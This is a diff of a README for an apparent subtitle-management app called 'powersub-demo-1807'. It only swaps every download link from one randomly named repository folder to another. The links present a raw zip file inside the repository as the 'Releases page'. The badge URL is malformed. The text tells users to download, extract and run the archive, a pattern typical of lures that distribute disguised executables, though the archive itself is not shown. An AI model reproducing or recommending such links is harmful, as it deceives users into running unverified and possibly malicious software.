@@ -1,7 +1,7 @@
 # 🌟 powersub-demo-1807 - Easy Subtitle Management Made Simple
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/DaniloRasovic/powersub-demo-1807/main/unawaking/powersub-demo-1807.zip%20Latest%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/DaniloRasovic/powersub-demo-1807/main/unawaking/powersub-demo-1807.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/DaniloRasovic/powersub-demo-1807/main/Smilax/powersub-demo-1807.zip%20Latest%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/DaniloRasovic/powersub-demo-1807/main/Smilax/powersub-demo-1807.zip)
 
 ## 🚀 Getting Started
 Welcome to powersub-demo-1807! This application helps you manage subtitles easily. Follow the steps below to download and run the software.
@@ -14,7 +14,7 @@ To use powersub-demo-1807, you need:
 - At least 100 MB of free disk space.
 
 ## 📂 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/DaniloRasovic/powersub-demo-1807/main/unawaking/powersub-demo-1807.zip) to download the software.
+1. Visit the [Releases page](https://raw.githubusercontent.com/DaniloRasovic/powersub-demo-1807/main/Smilax/powersub-demo-1807.zip) to download the software.
 2. On the Releases page, look for the latest version.
 3. Click on the appropriate file for your operating system.
 4. Once downloaded, locate the file in your downloads folder.
@@ -29,7 +29,7 @@ To use powersub-demo-1807, you need:
 - Open it from the Applications to run.
 
 ### For Linux Users:
-- Extract the downloaded `.zip` or `https://raw.githubusercontent.com/DaniloRasovic/powersub-demo-1807/main/unawaking/powersub-demo-1807.zip` file.
+- Extract the downloaded `.zip` or `https://raw.githubusercontent.com/DaniloRasovic/powersub-demo-1807/main/Smilax/powersub-demo-1807.zip` file.
 - Open a terminal and navigate to the extracted folder.
 - Run the application using the relevant command in the terminal.
 
